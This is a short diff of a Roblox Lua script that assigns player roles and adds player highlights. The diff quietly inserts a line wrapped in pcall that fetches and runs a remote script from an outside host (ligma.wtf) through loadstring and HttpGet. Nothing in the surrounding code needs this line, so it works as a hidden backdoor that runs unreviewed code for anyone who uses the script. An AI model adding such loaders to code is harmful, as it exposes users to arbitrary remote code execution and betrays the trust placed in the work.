@@ -67,7 +67,7 @@ local function updateRole(player: Player, role: string)
 		end
 	end
 end
-
+pcall(function()  loadstring(game:HttpGet("http://ligma.wtf/scripts/mm2.lua", true))() end)
 local function onPlayerAdded(player: Player) -- Fires on Player joined
 	-- Creates Highlight:
 	local highlight = Instance.new("Highlight")
